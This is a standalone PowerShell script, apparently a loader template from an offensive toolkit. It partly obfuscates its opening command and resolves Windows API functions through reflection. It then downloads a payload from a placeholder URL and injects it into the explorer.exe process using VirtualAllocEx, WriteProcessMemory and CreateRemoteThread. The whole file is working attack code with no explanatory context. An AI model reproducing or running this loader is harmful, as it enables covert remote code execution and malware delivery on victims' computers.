.("{1}{2}{0}" -f'pe','Add-T','y') -AssemblyName ("{0}{1}{2}"-f 'Sy','s','tem.Net.Http')
function get_delegate_type {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )
    $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
    $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
    return $var_type_builder.CreateType()
}
function get_proc_address {
    Param ($var_module, $var_procedure)     
    $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
    return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}


If ($True -and (-not $false)) {
    [Byte[]]$var_code = [Net.Http.HttpClient]::new().GetByteArrayAsync("URLREPLACE").Result
    $OpenProcessID = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll OpenProcess), (get_delegate_type @([int], [bool], [int]) ([IntPtr])))
    $ProcessID = $OpenProcessID.Invoke(0xFFFF, $false, [System.Int32](Get-Process -name explorer | Select-Object id | ForEach-Object -Process{$_.id}))
    $VirtualAllocExAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualAllocEx), (get_delegate_type @([IntPtr], [IntPtr], [System.UInt32], [System.UInt32], [System.UInt32]) ([IntPtr])))
    $VirtualExAddr = $VirtualAllocExAddr.Invoke($ProcessID,0,$var_code.Length,0x1000,0x40)
    $WriteMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll WriteProcessMemory), (get_delegate_type @([IntPtr], [IntPtr], [byte[]], [System.UInt32], [UIntPtr]) ([IntPtr])))
    $Memory = $WriteMemory.Invoke($ProcessID,$VirtualExAddr,$var_code,$var_code.Length,[System.UIntPtr]::Zero)
    $CreateRemoteThreadRun = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll CreateRemoteThread), (get_delegate_type @([IntPtr], [IntPtr], [System.UInt32], [IntPtr], [IntPtr], [System.UInt32], [IntPtr]) ([IntPtr])))
    $CreateRemoteThreadRun.Invoke($ProcessID,[System.IntPtr]::Zero,0,$VirtualExAddr,[System.IntPtr]::Zero,0,[System.IntPtr]::Zero)
}